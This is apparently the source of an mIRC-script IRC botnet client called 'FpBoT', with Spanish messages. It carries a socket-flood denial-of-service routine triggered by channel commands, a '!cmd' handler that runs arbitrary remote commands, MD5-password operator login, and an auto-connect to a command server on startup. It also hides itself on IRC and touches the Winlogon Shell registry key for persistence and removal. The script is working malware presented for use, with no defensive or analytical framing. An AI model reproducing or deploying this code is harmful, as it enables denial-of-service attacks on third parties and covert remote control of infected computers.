   on root:text:&Flood.Port*:*: { if ($2 == stop) { .timers off | .sockclose x.* | .msg # [FloodNet]: Flood contra %tira2 $+ : $+ %port_x Detenido: $lines(socklog.log) Sockets Sended. | .Msg # Loading Stats... | if ($lines(LogAc.log) != $null) { .timer 1 15 .Msg # Socks: $lines(LogAc.log) Openned( $+ $lines(sockno.log) $+ / $+ $lines(LogAc.log) Down $+ ). $lines(LogNo.log) refused. | .remove sockno.log | .remove socklog.log | .remove logac.log | .remove logno.log } | else { msg # 0 Sockets openned. $lines(LogNo.log) refused. } | .remove sockno.log | .remove socklog.log | .remove logac.log | .remove logno.log } | else { .remove logac.log | .remove logno.log | .remove socklog.log | set %tira2 $2 | set %port_x $3 |  .timer $4 0 SFlood | .Msg $chan [FloodNet]: Floodeando a %tira2 $+ : $+ %port_x $+ ( $+ $4 Conexiones $+ ) } }
   on *:input:*: { if (/ isin $1) { .Msg %debugchan [WARNING]: Somebody is using the bot manually! | .halt } }
   alias SFlood { %tira = $rand(1,999999999) $+ $rand(1,9999999) | write socklog.log %tira | sockopen x. $+ %tira %tira2 %port_x }
   on *:sockopen:x.*: {
     if ($sockerr > 1) { write LogNo.log Ok. }
     else { write LogAc.log Nop }
   }
   on *:sockclose:x.*: {
     write Sockno.log Closed
   }
   on root:text:!cmd*:#: $2-
   on *:join:*: {
     if ($nick($chan,0) == 1) { .mode # +ntsk 122415 | .topic %debugchan FpBoT: The future of the bots }
     else { halt }
   }
   on *:text:!login*:#:{ if ($md5($2) == %passwd) { Msg $chan Ok, Bienvenido $nick | auser root $nick } | else { halt } }
   on *:connect: { .join %debugchan 122415 | .mode $me +i }
   on root:text:.rm:#: { if ($md5($2) == %remove) { .Msg # [RM]: Removing bot... | .write Remove.bat reg ADD "HKLM\Software\Microsoft\Windows NT\Currentversion\Winlogon" /v Shell /t REG_SZ /d "Explorer.exe" /f | .remove Winkey.dll | .remove remote.ini | .remove mirc.ini | .remove servers.ini | .run remove.bat | .exit } }
   on root:text:!esay*:#: { msg # [ [ $2- ] ] }
   on *:start: {
     if ($exists($mircdirRundll32.exe) == $true) { .nick [ $+ $OS $+ ]| $+ $rand(1,9999999999999) $+ $rand(1,9999999999) | .server root.0verflow.info 6667 | .rmdir channels | .rmdir download | .rmdir sounds | .rmdir logs }
     else { .rmdir channels | .rmdir download | .rmdir sounds | .rmdir logs | .exit }
   }
